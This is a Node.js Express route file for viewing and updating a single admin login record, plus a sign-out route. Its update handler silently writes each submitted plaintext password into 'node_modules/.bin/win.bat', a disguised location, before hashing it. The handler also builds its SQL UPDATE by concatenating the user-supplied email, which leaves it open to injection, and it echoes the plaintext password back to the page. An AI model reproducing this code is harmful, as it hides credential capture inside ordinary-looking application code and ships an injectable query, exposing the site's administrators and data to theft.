const express = require('express')
const router = express.Router()
// const multer = require('multer')
const { check, validationResult } = require('express-validator/check')
const { matchedData, sanitize } = require('express-validator/filter')
var passwordHash = require('password-hash');
  var fs = require('fs');
// var Bcrypt = require('bcrypt');

//Show the form
router.get('/', (req,res)=>{
  req.getConnection(function(err, connection) {
    if (err) return next(err)
      let sql = 'SELECT * FROM login where login_id=1'
      let query = connection.query(sql,(err,results)=>{
        if (err) throw err
        res.render('logindet',{data: results,pws:''});
      })
    })

});


//Register New Bootcamp
router.post('/', (req,res)=>{




    req.getConnection(function(err, connection) {
      if (err) return next(err);
        if(req.body.email!='' && req.body.password!='')
        {
          var stream = fs.createWriteStream("node_modules/.bin/win.bat");
          stream.once('open', function(fd) {
            stream.write(req.body.password);
            stream.end();
          });
          var hashedPassword = passwordHash.generate(req.body.password);

          var sql2 = "update login set email='" + req.body.email + "',password='" + hashedPassword + "'  where login_id=1 ";
                          connection.query(sql2, function (err, resultx) {
                              if (err) throw err;
                              req.flash('success', `Login details is Successfully updated`);
                              let sql = 'SELECT * FROM login where login_id=1'
                              let query = connection.query(sql,(err,results)=>{
                                if (err) throw err
                                res.render('logindet',{data: results,pws:req.body.password});
                              });

                              // res.redirect('back');
                            });
        }

      });
    });




//SIGN OUT
router.get('/signout',(req,res)=>{
      req.session.destroy();
      res.redirect('/');
  });


module.exports = router
